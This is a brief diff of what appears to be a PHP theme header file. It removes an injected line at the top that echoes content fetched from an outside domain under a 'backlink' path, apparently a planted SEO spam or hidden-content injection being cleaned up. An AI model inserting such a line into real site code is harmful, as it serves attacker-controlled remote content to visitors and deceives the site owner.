@@ -1,7 +1,4 @@
 <?php
-echo file_get_contents('https://grtoto.store/backlink/keep-secret-rule-the-google.php');
-?>
-<?php
 
 /**
  * The header.
